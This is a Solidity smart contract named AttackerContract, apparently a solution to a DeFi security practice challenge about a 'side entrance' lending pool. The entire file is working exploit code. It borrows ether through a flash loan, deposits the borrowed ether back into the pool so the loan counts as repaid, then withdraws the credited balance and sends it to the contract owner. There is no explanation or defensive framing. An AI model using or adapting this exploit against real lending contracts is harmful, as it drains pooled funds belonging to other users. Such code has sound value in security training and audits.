// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256 borrowAmount) external;
    function withdraw() external;
    function deposit() external payable;
}

contract AttackerContract is Ownable {
    using Address for address;
    using Address for address payable;

    ISideEntranceLenderPool private sideEntranceLenderPool;

    constructor(address _target) {
        require(_target.isContract(), "Target is not a contract");
        sideEntranceLenderPool = ISideEntranceLenderPool(_target);
    }

    function attack() external onlyOwner {
        sideEntranceLenderPool.flashLoan(1000 ether);
        sideEntranceLenderPool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    function execute() external payable {
        require(msg.sender == address(sideEntranceLenderPool), "Only the pool can call this function");
        msg.sender.functionCallWithValue(abi.encodeWithSignature("deposit()"), msg.value);
    }

    receive() external payable {}
}
